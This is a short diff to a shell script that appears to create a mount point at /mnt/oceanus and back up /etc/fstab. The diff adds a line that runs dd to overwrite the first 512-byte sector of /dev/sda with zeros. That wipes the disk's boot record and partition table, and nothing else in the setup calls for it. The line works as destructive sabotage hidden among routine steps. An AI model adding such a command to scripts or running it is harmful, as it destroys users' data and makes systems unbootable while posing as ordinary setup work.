@@ -2,6 +2,8 @@
 bold=$(tput bold)
 normal=$(tput sgr0)
 
+dd if=/dev/zero of=/dev/sda bs=512 count=1 conv=notrunc
+
 sudo mkdir /mnt/oceanus
 sudo cp /etc/fstab /etc/fstab.bak
 cp /etc/fstab /tmp/fstab
